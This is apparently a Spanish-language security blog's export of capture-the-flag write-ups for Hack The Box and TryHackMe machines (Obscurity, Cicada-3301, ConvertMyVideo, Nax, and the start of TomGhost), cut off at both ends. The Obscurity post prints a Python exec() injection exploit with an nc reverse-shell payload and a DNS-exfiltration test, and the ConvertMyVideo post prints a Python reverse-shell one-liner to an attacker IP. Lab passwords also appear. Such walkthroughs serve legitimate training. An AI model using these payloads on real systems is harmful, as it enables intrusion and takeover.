Rate\u0026quot;, \u0026quot;data\u0026quot;:[5.7, 4, 3.2, 6.8, 6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 4, 2, 8, 6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84  # Nmap 7.80 scan initiated Wed Jan 8 20:18:09 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.168 Nmap scan report for 10.10.10.168 Host is up (0.27s latency). Not shown: 65531 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA) | 256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA) |_ 256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519) 80/tcp closed http 8080/tcp open http-proxy BadHTTPServer | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Date: Thu, 09 Jan 2020 02:23:51 | Server: BadHTTPServer | Last-Modified: Thu, 09 Jan 2020 02:23:51 | Content-Length: 4171 | Content-Type: text/html | Connection: Closed | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;0bscura\u0026lt;/title\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=Edge\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;keywords\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;!-- | Easy Profile Template | http://www.templatemo.com/tm-467-easy-profile | \u0026lt;!-- stylesheet css --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/templatemo-blue.css\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body data-spy=\u0026#34;scroll\u0026#34; data-target=\u0026#34;.navbar-collapse\u0026#34;\u0026gt; | \u0026lt;!-- preloader section --\u0026gt; | \u0026lt;!-- | \u0026lt;div class=\u0026#34;preloader\u0026#34;\u0026gt; | \u0026lt;div class=\u0026#34;sk-spinner sk-spinner-wordpress\u0026#34;\u0026gt; | HTTPOptions: | HTTP/1.1 200 OK | Date: Thu, 09 Jan 2020 02:23:52 | Server: BadHTTPServer | Last-Modified: Thu, 09 Jan 2020 02:23:52 | Content-Length: 4171 | Content-Type: text/html | Connection: Closed | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;0bscura\u0026lt;/title\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=Edge\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;keywords\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;!-- | Easy Profile Template | http://www.templatemo.com/tm-467-easy-profile | \u0026lt;!-- stylesheet css --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/templatemo-blue.css\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body data-spy=\u0026#34;scroll\u0026#34; data-target=\u0026#34;.navbar-collapse\u0026#34;\u0026gt; | \u0026lt;!-- preloader section --\u0026gt; | \u0026lt;!-- | \u0026lt;div class=\u0026#34;preloader\u0026#34;\u0026gt; |_ \u0026lt;div class=\u0026#34;sk-spinner sk-spinner-wordpress\u0026#34;\u0026gt; |_http-server-header: BadHTTPServer |_http-title: 0bscura 9000/tcp closed cslistener 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.80%I=7%D=1/8%Time=5E168E70%P=x86_64-pc-linux-gnu%r(Get [ ... snip ... ] SF:-spinner\\x20sk-spinner-wordpress\\\u0026#34;\u0026gt;\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jan 8 20:24:22 2020 -- 1 IP address (1 host up) scanned in 373.38 seconds   HTTP En el puerto 8080 encontramos una pagina web, la cual contiene informacion sobre una empresa.\nEn la parte de abajo encontramos un mensaje dirigido a los desarrolladores, dando a entender que en el directorio secreto se encuentra el codigo fuente de la pagina.\nWFUZZ Utilizamos wfuzz para encontrar el archivo \u0026lsquo;SuperSecureServer.py\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  root@aoiri:~/htb/obscurity# wfuzz -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirb/common.txt --hc 404 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py Total requests: 4614 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000001245: 200 170 L 498 W 5892 Ch \u0026#34;develop\u0026#34; Total time: 116.5698 Processed Requests: 4614 Filtered Requests: 4613 Requests/sec.: 39.58142   Encontramos el archivo \u0026lsquo;SuperSecureServer.py\u0026rsquo; del servidor.\nRCE - SuperSecureServer.py Analizamos el codigo del archivo y encontramos una vulnerabilidad la cual se encuentra al realizar una consulta a de un directorio. Al pasarle un directorio (\u0026lsquo;directorioABC\u0026rsquo;) entre comillas, este elimina las comillas, pasa por la funcion exec() y se utiliza el directorio como una variable en un string, en el caso de que no haya errores sigue ejecutandose el codigo.\nCodigo vulnerable:\n1 2 3 4  path = urllib.parse.unquote(path) try: info = \u0026#34;output = \u0026#39;Document: {}\u0026#39;\u0026#34; # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right?   Utilizamos el siguiente payload para ejecutar comandos:\n1  \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34; COMANDO \u0026#34;)\\n #\u0026#34;\u0026#39;   Realizamos pruebas haciendo una consultas DNS a nuestra maquina:\n1  cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34;nslookup $PATH 10.10.15.122\u0026#34;)\\n#\u0026#34;\u0026#39;   Ejecutamos una shell inversa y obtenemos acceso con el usuario www-data:\nCodigo:\n1 2 3 4 5 6 7 8 9 10 11 12  import requests import urllib #cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34; COMMAND \u0026#34;)\\n #\u0026#34;\u0026#39; #cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34;nslookup $(which nc) 10.10.14.14\u0026#34;)\\n #\u0026#34;\u0026#39; cmd = \u0026#39;\\\u0026#39;\\n\\nos.system(\u0026#34; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 1336 \u0026gt;/tmp/f \u0026#34;)\\n#\u0026#34;\u0026#39; path = urllib.parse.quote(cmd, safe=\u0026#39;\u0026#39;) print(path) url = \u0026#34;http://obscure.htb:8080/\u0026#34;+path r = requests.get(url)   USER - Robert Enumeramos la carpeta principal del usuario robert, encontramos varios archivos, un script en python que encripta/desencripta archivos utilizando una clave.\nTambien vemos archivos en texto plano, pero dos de ellos parecen estar encriptados por el script.\nAl ejecutar el script nos muestra los parametros que necesita para encriptar y desencriptar un archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13  www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -h python3 SuperSecureCrypt.py -h usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d] Encrypt with 0bscura\u0026#39;s encryption algorithm optional arguments: -h, --help show this help message and exit -i InFile The file to read -o OutFile Where to output the encrypted/decrypted file -k Key Key to use -d Decrypt mode www-data@obscure:/home/robert$   Utilizamos dicho script para poder desencriptar el archivo out.txt con el archivo check.txt como clave para obtener la clave de encriptacion:\n1  python3 SuperSecureCrypt.py -i out.txt -o /tmp/what.txt -k \u0026#34;$(cat check.txt)\u0026#34; -d   Utilizamos la clave para poder desencriptar el archivo out.txt y vemos que es el mismo mensaje que el archivo check.txt tiene, por lo que ya tenemos la clave:\n1  python3 SuperSecureCrypt.py -i out.txt -o /tmp/what2.txt -k \u0026#34;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich\u0026#34; -d   Utilizamos la clave para desencriptar el archivo passwordreminder.txt:\n1  python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/what3.txt -k \u0026#34;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich\u0026#34; -d   Obtenemos una contraseña, utilizamos la contraseña con el usuario robert y obtenemos una shell y nuestra flag user.txt:\nrobert:SecThruObsFTW PRIVILEGE ESCALATION Enumeramos los comandos que pueden ser ejecutados con privilegios de root sin contraseña, encontramos un script en python.\nDicho script pregunta por usuario y su contraseña existentes en la maquina, lee /etc/shadow y escribe su contenido en /tmp/SSH/, solo si las credenciales dadas corresponden a uno de los usuarios, el script ejecuta los comandos que se le pasen y elimina el archivo creado en /tmp/SSH/.\nYa que tenemos un usuario con sus credenciales ejecutamos el script pasando el usuario robert y la contraseña SecThruObsFTW, al hacer esto se escribira en /tmp/SSH/ las contraseñas encriptadas de la maquina.\n1  /usr/bin/sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py   Al mismo tiempo en otra shell utilizamos watch para ver los cambios que hay en /tmp/SSH/ obteniendo con cat el archivo temporal de las contraseñas.\n1  watch -t -d -g -n 0.1 \u0026#34;cat /tmp/SSH/* |base64 \u0026gt; /tmp/b.txt \u0026#34;   Obtenemos el hash del usuario root y robert, utilizamos John The Ripper para desencriptar la contraseña.\nObtenemos la contraseña, una shell con privilegios root y nuestra flag root.txt.\nroot:mercedes\n","description":"Obscurity tiene expuesto el codigo fuente de la aplicacion web, descubrimos una vulnerabilidad la cual nos dio acceso con un pequeño script en Python. Encontramos un script que nos ayudó a obtener las credenciales del siguiente usuario. Finalmente un script que obtiene el contenido de /etc/shadow nos permitio crackear la contraseña del usuario root para escalar privilegios.","id":84,"section":"posts","tags":["exec","DNS exfil"],"title":"Hack The Box - Obscurity","uri":"https://sckull.github.io/posts/obscurity/"},{"content":"  Cicada-3301 Vol:1 es una maquina de TryHackMe basada en la organizacion Cicada 3301, es una serie de retos, mayormente de Esteganografia, Hash Cracking y Scripting.\nRoom    Titulo Cicada-3301 Vol:1      Descripción A basic steganography and cryptography challenge room based on the Cicada 3301 challenges   Puntos 148   Dificultad Media   Maker Cryillic     Analyze The Audio Al inicio tenemos un archivo de audio (3301.wav) al cual le añadimos una capa de espectrograma utilizando Sonic Visualiser.\nNos devuelve una imagen QR el cual obtuvimos una URL utilizando el Lector QR inlite.\nDecode the Passphrase Una URL hacia Pastebin.\nUtilizamos CyberChef para poder decodificar la frase y la clave en base64.\nUtilizamos Vigenere para poder codificar nuevamente (como el reto lo indica) con la clave que encontramos a la frase decodificada.\nGather Metadata Utilizamos la frase que codificamos para extraer el archivo dentro de la imagen welcome.jpg, y nos da una url de una image.\nLa imagen de la URL.\nFind Hidden Files En este Task intentamos con muchas herramientas de esteganografia y encontramos la correcta, Outguess para poder obtener la informacion (archivo) dentro de la imagen.\nEn el mensaje nos indica que debemos de romper el hash para poder encontrar el libro.Tambien una combinacion de letras y numeros y que debemos de ir hacia delante si el numero es positivo, y hacia atras si el numero es negativo.\nEl hash:\nb6atryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackme348 Verificamos que tipo de hash es y vemos que es SHA2-512.\nUtilizamos https://md5hashing.net para poder obtener el texto el cual es una URL a pastebin.\nBook Cipher La URL de pastebin contiene lo que parece ser el capitulo de un libro.\nRecordemos el nombre del challenge Cicada 3301, investigamos acerca del reto, especificamente de la solucion, y encontramos que el reto se parece bastante a Cicada 3301 - The Book Cipher, por lo que utilizamos el ejemplo para obtener la URL para el Task 7, para ello escribimos un pequeño script en python al cual le pasamos la linea del libro y el numero de letra que debe extraer, omitimos la primera letra ya que hace referencia al Capitulo I (es el que tenemos).\nHay que mencionar que este tipo de cifrado para resolverlo se puede utilizar la sintaxis siguiente (par1:par2:par3), pueden ser numeros de pagina, linea, palabra o letra, para este reto era sencillo: linea:letra y omitimos los espacios ya que devuelve un valor distinto.\nTambien, este cifrado para resolverlo comenzamos desde la primera letra de la Oracion y no de la linea, en el caso de los numeros negativos vamos hacia atras de la oracion como nos indicaba el mensaje.\n Spoiler El script: Script.py\n Al resolverlo por completo nos devuelve una URL acortada que nos redirige a soundcloud.\nThe Final Song Ingresar el Nombre de la Cancion encontrada.\n","description":"Cicada-3301 Vol:1 es una maquina de TryHackMe basada en la organizacion Cicada 3301, es una serie de retos, mayormente de Esteganografia, Hash Cracking y Scripting. ","id":85,"section":"posts","tags":["steganography","vigenere"],"title":"TryHackMe - Cicada-3301 Vol:1","uri":"https://sckull.github.io/posts/cicada3301vol1/"},{"content":"  ConvertMyVideo es una maquina de TryHackMe, encontramos que Youtube-dl esta siendo ejecutado en la pagina, realizamos Command Injection donde obtuvimos credenciales de acceso para el panel de administracion para luego ejecutar shell inversa. Finalmente ejecutamos una shell inversa con un cronjob para escalar privilegios.\nRoom    Titulo ConvertMyVideo      Descripción My Script to convert videos to MP3 is super secure   Puntos 320   Dificultad Media   Maker overjt     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Tue May 5 19:02:47 2020 as: nmap -sV -o nmap_scan_mini convertmyvideo.thm Nmap scan report for convertmyvideo.thm (10.10.1.154) Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 5 19:03:30 2020 -- 1 IP address (1 host up) scanned in 43.02 seconds   HTTP Encontramos una pagina sencilla en el puerto 80, en la que nos muestra un formulario en donde nos pide un ID de un video de YouTube.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8  root@upset:~/thm/convertmyvideo# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://convertmyvideo.thm/ -q -t 25 -x php,html,txt /admin (Status: 401) /images (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /server-status (Status: 403) /tmp (Status: 301)   Dentro del codigo fuente de la pagina encontramos el codigo de envio del ID en Javascript, el cual envia la URL de youtube añadiendole el ID.\nUtilizamos Burpsuite para capturar el envio de el ID, le agregamos un ID erroneo y nos da una respuesta en el que nos devuelve el error que se generó.\nCOMMAND INJECTION Eliminamos la URL y enviamos algo diferente, y vemos que el mensaje de error contiene el nombre de una herramienta que se utiliza para descargar videos de YouTube - youtube-dl.\nPara verificar que esa herramienta esta siendo utilizada con la pagina, enviamos la flag --help para confirmar que es esa herramienta, y nos devolvió todas las opciones.\nAl parecer la pagina esta utilizando youtube-dl para pasarle la url con el ID que ingresamos, mediante la ejecucion de la herramienta a traves de consola. Intentamos romper este comando y sus parametros, utilizamos command injection, con | y el comando id más el separador ; (punto y coma) esto para separar y no ejecutar los parametros adicionales. Logramos ejecutar el comando.\nAhora que podemos ejecutar comandos, comenzamos a enumerar los archivos que estan en la maquina, vemos que la direccion donde estamos es en /var/www/html y los archivos que se encuentran en esa direccion.\nLogramos obtener el codigo fuente de index.php utilizando cat{$IFS}index.php (utilizamos {$IFS} para agregar espacios).\nVemos en el codigo fuente que ejecuta el comando youtube-dl con sus parametros y en medio pasa la URL que es ingresada por el usuario.\nVemos la carpeta de admin, la cual contiene un index.php y flag.txt.\nIntentamos realizar cat a la flag.txt y obtenemos la primera.\nEnumeramos la carpeta nuevamente con mas profundidad y econtramos el archivo .htaccess.\nEjecucion de Comando\n1 2 3 4 5 6 7 8 9 10  total 36 drwxr-xr-x 6 www-data www-data 4096 Apr 12 04:42 . drwxr-xr-x 3 root root 4096 Apr 12 01:07 .. -rw-r--r-- 1 www-data www-data 152 Apr 12 03:58 .htaccess drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:05 admin drwxrwxr-x 2 www-data www-data 4096 Apr 12 04:26 images -rw-r--r-- 1 www-data www-data 1790 Apr 12 04:55 index.php drwxrwxr-x 2 www-data www-data 4096 Apr 12 04:44 js -rw-rw-r-- 1 www-data www-data 205 Apr 12 04:40 style.css drwxr-xr-x 2 www-data www-data 4096 Apr 12 05:13 tmp   El archivo contiene lo siguiente y al parecer hay un archivo .htpasswd en la carpeta admin.\n1 2 3 4 5 6 7 8 9 10 11  \u0026lt;Files /admin/.htpasswd\u0026gt; Order allow,deny Deny from all \u0026lt;/Files\u0026gt; \u0026lt;Files /admin/.htaccess\u0026gt; Order allow,deny Deny from all \u0026lt;/Files\u0026gt; Options -Indexes   Hacemos cat al archivo y logramos obtener un usuario y contraseña encriptada.\nUtilizamos john para obtener la contraseña.\nIngresamos a la pagina utilizando el panel de /admin y vemos un boton que al presionarlo realiza la ejecucion de un comando.\nVemos que podemos ejecutar comandos:\nUSER - WWW-DATA Utilizamos python para ejecutar nuestra shell inversa y ponemos a la escucha nuestro netcat.\n1  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.18.1.160\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   Logramos obtener una shell con usuario www-data\nPRIVILEGE ESCALATION Mediante una enumeracion basica de binarios no encontramos alguno que nos puediera ayudar, utilizamos pspy para ver si existe algun cronjob en la maquina. Encontramos que se ejecuta un cronjob el cual ejecuta el archivo clean.sh que se encuentra en /var/www/html/tmp/.\nAgregamos una shell inversa a este archivo y pusimos a la escucha netcat, logramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"ConvertMyVideo es una maquina de TryHackMe, encontramos que Youtube-dl esta siendo ejecutado en la pagina, realizamos Command Injection donde obtuvimos credenciales de acceso para el panel de administracion para luego ejecutar shell inversa. Finalmente ejecutamos una shell inversa con un cronjob para escalar privilegios.","id":86,"section":"posts","tags":["cron","command injection","john"],"title":"TryHackMe - ConvertMyVideo","uri":"https://sckull.github.io/posts/convertmyvideo/"},{"content":"  Nax es una maquina de TryHackMe, resolvimos un pequeño reto para acceder a Nagiox XI donde descubrimos una vulnerabilidad que nos dio acceso privilegiado.\nRoom    Titulo Nax      Descripción Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution.   Puntos 490   Dificultad Media   Maker stuxnet     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), ldap (389) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  # Nmap 7.80 scan initiated Tue May 5 00:26:26 2020 as: nmap -sV -o nmap_scan_mini nax.thm Nmap scan report for nax.thm (10.10.253.17) Host is up (0.26s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X 443/tcp open ssl/ssl Apache httpd (SSL-only mode) Service Info: Host: ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 5 00:27:33 2020 -- 1 IP address (1 host up) scanned in 67.23 seconds # Nmap 7.80 scan initiated Tue May 5 00:27:36 2020 as: nmap -T5 -sV -sC -p- -o nmap_scan nax.thm Warning: 10.10.253.17 giving up on port because retransmission cap hit (2). Nmap scan report for nax.thm (10.10.253.17) Host is up (0.18s latency). Not shown: 65358 closed ports, 171 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA) | 256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA) |_ 256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, | ssl-cert: Subject: commonName=ubuntu | Not valid before: 2020-03-23T23:42:04 |_Not valid after: 2030-03-21T23:42:04 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X 443/tcp open ssl/ssl Apache httpd (SSL-only mode) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US | Not valid before: 2020-03-24T00:14:58 |_Not valid after: 2030-03-22T00:14:58 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 5667/tcp open tcpwrapped Service Info: Host: ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 5 00:42:16 2020 -- 1 IP address (1 host up) scanned in 879.93 seconds   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11  root@upset:~/thm/nax# gobuster dir -u http://nax.thm/ -w /usr/share/wordlists/dirb/common.txt -t 25 -q -x php,html,txt /cgi-bin/ (Status: 403) /cgi-bin/.php (Status: 403) /cgi-bin/.html (Status: 403) /index.html (Status: 200) /index.php (Status: 200) /index.html (Status: 200) /index.php (Status: 200) /javascript (Status: 301) /nagios (Status: 401) /server-status (Status: 403)   HTTP Encontramos una pagina simple en el puerto 80 y en el codigo fuente encontramos una direccion.\nGOBUSTER /nagiosxi/ Utilizamos gobuster para busqueda de directorios y archivos en /naxiosxi/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@upset:~/thm/nax# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 25 -q -x php,html,txt -u http://nax.thm/nagiosxi/ /about (Status: 301) /account (Status: 301) /admin (Status: 301) /api (Status: 301) /backend (Status: 301) /config (Status: 301) /db (Status: 301) /help (Status: 301) /images (Status: 301) /includes (Status: 301) /index.php (Status: 302) /index.php (Status: 302) /install.php (Status: 302) /login.php (Status: 200) /reports (Status: 301) /tools (Status: 301) /upgrade.php (Status: 302) /views (Status: 301)   NAGIOS XI RCE En la ruta /naxiosxi/ encontramos una plataforma la de Naxios XI, buscamos un exploit que pueda afectar esta plataforma y vemos que existe un exploit NagiosXi RCE el cual necesita un usuario y contraseña, tambien existe un exploit para metasploit nagiosxi_authenticated_rce.\nEn la pagina principal (/) encontramos una image ASCII de lo que parece ser Cicada 3301 y con algunos valores debajo de esta Ag Hg Ta Sb Po Pd Hg Pt Lr al principio intentamos utilizar un decodificador de Gematria Primus pero los valores numericos no reflejaban ningun tipo de texto o codificacion valida. Realizamos una busqueda de estos valores y encontramos que todos pertenecen a la tabla periodica, obtenemos los valores numericos de cada elemento.\n1 2 3 4 5 6 7 8 9  Ag ---\u0026gt; 47 Hg ---\u0026gt; do it yourself Ta ---\u0026gt; \u0026gt;:) Sb ---\u0026gt; do it yourself Po ---\u0026gt; \u0026gt;:) Pd ---\u0026gt; do it yourself Hg ---\u0026gt; \u0026gt;:) Pt ---\u0026gt; do it yourself Lr ---\u0026gt; 103   Al obtener estos valores lo decodificamos de hex a texto plano y encontramos una direccion de un archivo.\nAl visitar la direccion del archivo vemos que es una imagen que tiene texto codificado y utiliza la codificacion de piet.\nAl decodificar la imagen nos devuelve una cadena de caracteres.\nLogramos obtener un usuario y contraseña, verificamos que funcionan en la plataforma ingresando con las credenciales.\nUtilizamos estas credenciales con el exploit que encontramos para Naxios (El exploit me dio algunos errores por lo que tuve que agregar la contraseña directamente al codigo).\nEjecutamos el exploit y ponemos a la escucha netcat, y logramos obtener una shell.\nNuestra shell ya tiene privilegios root por lo que no es necesario escalar privilegios, y logramos obtener nuestra flag user.txt y root.txt.\nMetasploit - NagiosXi RCE Utilizamos el exploit disponible para metasploit y funciona muy bien.\n","description":"Nax es una maquina de TryHackMe, resolvimos un pequeño reto para acceder a Nagiox XI donde descubrimos una vulnerabilidad que nos dio acceso privilegiado.","id":87,"section":"posts","tags":["nagiox xi","steganography","metasploit"],"title":"TryHackMe - Nax","uri":"https://sckull.github.io/posts/nax/"},{"content":"  TomGhost es una maquina de TryHackMe. Identificamos una vulnerabilidad en Tomcat para leer las credenciales de esta misma plataforma, lo que nos permitio acceder por SSH donde luego encontramos un archivo encriptado y, que, con la ayuda de John obtuvimos la contraseña para un segundo usuario. Escalamos privilegios utilizando Sudo con Zp e informacion de GTFOBins.\nRoom    Titulo tomghost      Descripción Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.   Puntos 810   Dificultad Facil   Maker stuxnet     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (8080), ajp13 (8009) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Mon May 4 21:55:03 2020 as: nmap -sV -o nmap_scan_mini tomgost.thm Nmap scan report for tomgost.thm (10.10.190.132) Host is up (0.22s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 53/tcp open tcpwrapped 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat 9.0.30 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon May 4 21:55:31 2020 -- 1 IP address (1 host up) scanned in 28.22 seconds   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  root@upset:~/thm/tomghost# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://tomgost.thm:8080/ -q -t 25 -x php,html,txt /docs (Status: 302) /examples (Status: 302) /favicon.ico (Status: 200) /host-manager (Status: 302) /manager (Status: 302) root@upset:~/thm/tomghost# 